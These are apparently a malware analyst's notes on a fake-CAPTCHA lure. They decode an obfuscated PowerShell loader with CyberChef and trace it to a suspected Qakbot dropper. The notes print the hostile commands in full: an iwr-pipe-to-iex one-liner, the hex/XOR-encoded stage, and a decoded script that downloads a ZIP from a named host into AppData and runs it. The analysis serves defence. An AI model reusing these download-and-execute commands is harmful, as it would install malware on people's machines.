
1. **Browserling**: An online browser sandbox used to safely view and interact with suspicious URLs.
    
2. **VirusTotal**: A service used to scan files and URLs for viruses and other types of malware.
    
3. **Recorded Future's Triangulation Tool**: Used to outline and analyze the behavior of malware on a Windows 10 system.
    
4. **Joe's Sandbox**: An automated analysis tool used to examine the behavior of malware samples.

- [Browserling](https://www.browserling.com/)
- [VirusTotal](https://www.virustotal.com/)
- [Recorded Future](https://www.recordedfuture.com/)
- [Joe's Sandbox](https://www.joesecurity.org/)
- [URLscan.io](https://urlscan.io/)

Can search Urlscan for recent fakecaptcha websites: fitler: page.url:"captcha".

- hxxps://captcha-cf[.]com
- powershell -w 1 iwr hxxp://captcha-cf[.]com/mymindtpgnme[.]txt|iex # Request filtered by CF ( ID: c7d266e12202bf2e )
  
  [Detect Web Browser Settings - WhatIsMyBrowser.com](https://www.whatismybrowser.com/detect/)

```powershell
iwr -uri https://www.whatismybrowser.com/detect/what-is-my-user-agent | select -exp Content | findstr "detected_value"
```

script contains largely garbage values with some actual functions mixed in.

Fake verification message
```powershell
Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.MessageBox]::Show('Verification complete!', 'Information', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information);
```

second stage
```powershell
$tqKi =([regex]::Matches('c2ced3c3dfdfdbd8918484cfdec4c7c2c5ccc4d885c8c4c684c6d2cdd9c2cec5cfc2d8c7c4dc85d1c2db8fffe3eadffed18b968b8fcec5dd91eadbdbefcadfca90cddec5c8dfc2c4c58bc0ffeafe838fe7e9f3db878b8fe3ddf2e6c2e8f1c7da82d0c8ded9c78b8fe7e9f3db8b86c48b8fe3ddf2e6c2e8f1c7dad690cddec5c8dfc2c4c58bdde9c5f9c1cce9c7e88382d0cddec5c8dfc2c4c58bd2e4f8fee5fadffe838fe4f2cce0cfef82d0c2cd838a83ffced8df86fbcadfc38b86fbcadfc38b8fe3ddf2e6c2e8f1c7da8282d0c0ffeafe8b8fe4f2cce0cfef8b8fe3ddf2e6c2e8f1c7dad6d68fe3ddf2e6c2e8f1c7da8b968b8fcec5dd91eadbdbefcadfca8b808b8cf7c6d2cdd9c2cec5cfc2d8c7c4dc85d1c2db8c90d2e4f8fee5fadffe8b8fdfdae0c285f8dec9f8dfd9c2c5cc83988798928290eed3dbcac5cf86ead9c8c3c2ddce8b86fbcadfc38b8fe3ddf2e6c2e8f1c7da8b86efced8dfc2c5cadfc2c4c5fbcadfc38b8fffe3eadffed190eacfcf86ffd2dbce8b86ead8d8cec6c9c7d28bf8d2d8dfcec685e2e485e8c4c6dbd9ced8d8c2c4c585edc2c7cef8d2d8dfcec6908fdcfdc0cafbf18b968bf0e2e485e8c4c6dbd9ced8d8c2c4c585f1c2dbedc2c7cef69191e4dbcec5f9cecacf838fe3ddf2e6c2e8f1c7da82908fd3dfcaf18b96838fdcfdc0cafbf185eec5dfd9c2ced88bd78bf8c4d9df86e4c9c1cec8df8be5cac6ce8bd78bf8cec7cec8df86e4c9c1cec8df8b86edc2d9d8df8b9a8285e5cac6ce908fd3c1cae3efdfeafee38b968be1c4c2c586fbcadfc38b8fcec5dd91eadbdbefcadfca8b8fd3dfcaf190d8dfcad9df8b8fd3c1cae3efdfeafee38b90d6dde9c5f9c1cce9c7e890','.{2}') | % { [char]([Convert]::ToByte($_.Value,16) -bxor '171') }) -join '';& $tqKi.Substring(0,3) $tqKi.Substring(42);exit;
```

From hex + XOR decrypt using '171'.
```powershell
'iexhttps://duolingos.com/myfriendislow.zip$THAtUz = $env:AppData;function kTAU($LBXp, $HvYMiCZlq){curl $LBXp -o $HvYMiCZlq};function vBnRjgBlC(){function yOSUNQtU($OYgKdD){if(!(Test-Path -Path $HvYMiCZlq)){kTAU $OYgKdD $HvYMiCZlq}}$HvYMiCZlq = $env:AppData + '\myfriendislow.zip';yOSUNQtU $tqKi.SubString(3,39);Expand-Archive -Path $HvYMiCZlq -DestinationPath $THAtUz;Add-Type -Assembly System.IO.Compression.FileSystem;$wVkaPZ = [IO.Compression.ZipFile]::OpenRead($HvYMiCZlq);$xtaZ =($wVkaPZ.Entries | Sort-Object Name | Select-Object -First 1).Name;$xjaHDtAUH = Join-Path $env:AppData $xtaZ;start $xjaHDtAUH ;}vBnRjgBlC;','.{2}'
```

How to decode on cyberchef

1. **Open CyberChef**:
    
    - Visit [CyberChef](https://gchq.github.io/CyberChef/).
2. **Input the Hexadecimal String**:
    
    - Copy the hexadecimal string from the PowerShell script and paste it into the "Input" section of CyberChef.
3. **Add the "From Hex" Operation**:
    
    - In the "Recipe" section, search for "From Hex" and add it to the recipe. This will convert the hexadecimal string into bytes.
4. **Add the "XOR" Operation**:
    
    - Search for "XOR" in the operations list and add it to the recipe.
    - Set the key to `171` (as a decimal value) to match the XOR operation used in the script.
5. **View the Output**:
    
    - The output section will display the decoded string, which should reveal the original PowerShell command.

Fully decoded with renamed variables.
```powershell
# =============================================
# MALICIOUS SCRIPT DECODED & COMMENTED
# =============================================
# Original script was heavily obfuscated to hide its true intent.
# Below is a cleaned-up version for analysis purposes.
# WARNING: DO NOT RUN THIS SCRIPT—IT DOWNLOADS & EXECUTES MALWARE!
# =============================================

# --- Step 1: Extract a hidden command from an obfuscated string ---
# The original script used regex to extract every 2 characters and join them.
# This builds a PowerShell command stored in $hiddenCommand.
$hiddenCommand = ([regex]::Matches('iexhttps://duolingos.com/myfriendislow.zip$THAtUz = $env:AppData;function kTAU($LBXp, $HvYMiCZlq){curl $LBXp -o $HvYMiCZlq};function vBnRjgBlC(){function yOSUNQtU($OYgKdD){if(!(Test-Path -Path $HvYMiCZlq)){kTAU $OYgKdD $HvYMiCZlq}}$HvYMiCZlq = $env:AppData + ''\myfriendislow.zip'';yOSUNQtU $tqKi.SubString(3,39);Expand-Archive -Path $HvYMiCZlq -DestinationPath $THAtUz;Add-Type -Assembly System.IO.Compression.FileSystem;$wVkaPZ = [IO.Compression.ZipFile]::OpenRead($HvYMiCZlq);$xtaZ =($wVkaPZ.Entries | Sort-Object Name | Select-Object -First 1).Name;$xjaHDtAUH = Join-Path $env:AppData $xtaZ;start $xjaHDtAUH ;}vBnRjgBlC;','.{2}') | ForEach-Object { $_.Value } | Join-String -Separator '')

# --- Step 2: Execute the malicious payload ---
# The script splits $hiddenCommand into parts and executes it dynamically.
# This is a common evasion technique to avoid detection.

# The first 3 chars are "iex" (Invoke-Expression), which executes the rest.
$invokeExpression = $hiddenCommand.Substring(0, 3)  # "iex"
$maliciousPayload = $hiddenCommand.Substring(42)   # The rest of the malicious code

# Execute the payload (DANGEROUS!)
& $invokeExpression $maliciousPayload

# Force exit to hide any errors
exit

# =============================================
# DECOMPILED PAYLOAD (what $maliciousPayload contains)
# =============================================
# Below is the actual malicious logic that runs when the script executes.
# =============================================

# Set the target directory (usually %AppData%)
$targetDirectory = $env:AppData

# Function to download a file from a URL
function Download-File {
    param (
        [string]$url,        # Remote file URL
        [string]$outputPath  # Where to save the file
    )
    # Uses cURL to download the file (could be replaced with Invoke-WebRequest)
    curl $url -OutFile $outputPath
}

# Main malicious function
function Execute-MaliciousLogic {
    # Nested function to check and download the payload
    function Ensure-FileExists {
        param ([string]$fileUrl)
        # If the file doesn't exist, download it
        if (!(Test-Path -Path $outputFilePath)) {
            Download-File $fileUrl $outputFilePath
        }
    }

    # Path where the malicious ZIP will be saved
    $outputFilePath = "$env:AppData\myfriendislow.zip"

    # Download the malicious ZIP from the hidden URL
    $maliciousUrl = $hiddenCommand.SubString(3, 39)  # "https://duolingos.com/myfriendislow.zip"
    Ensure-FileExists $maliciousUrl

    # Extract the ZIP to %AppData%
    Expand-Archive -Path $outputFilePath -DestinationPath $targetDirectory

    # Load .NET compression libraries to inspect the ZIP
    Add-Type -AssemblyName System.IO.Compression.FileSystem

    # Open the ZIP and find the first file inside
    $zipArchive = [IO.Compression.ZipFile]::OpenRead($outputFilePath)
    $firstFileInZip = ($zipArchive.Entries | Sort-Object Name | Select-Object -First 1).Name

    # Construct the full path to the extracted file
    $fullMaliciousPath = Join-Path $env:AppData $firstFileInZip

    # Execute the extracted file (likely malware)
    Start-Process $fullMaliciousPath
}

# Run the malicious logic
Execute-MaliciousLogic
```

`duolingos[.]com/myfriendislow.zip` is not actually where the malicious zip is located. the website site has been setup to host a malicious PHP script which acts as a proxy, fetching the actual malicious content from a secondary tier of servers.

Malicious PHP:
```java
    <script language="Javascript">var _skz_pid = "9POBEX80W";</script>
    <script language="Javascript" src="https://cdn.jsinit.directfwd.com/sk-jspark_init.php"></script>
```

This file is a PHP Qakbot Dropper. the PHP dropper file has been taken down at this time. 

[Security Brief: ClickFix Social Engineering Technique Floods Threat Landscape | Proofpoint AU](https://www.proofpoint.com/au/blog/threat-insight/security-brief-clickfix-social-engineering-technique-floods-threat-landscape)

[What is Qakbot Malware? Definition, Detection & Removal](https://www.darktrace.com/cyber-ai-glossary/qakbot)
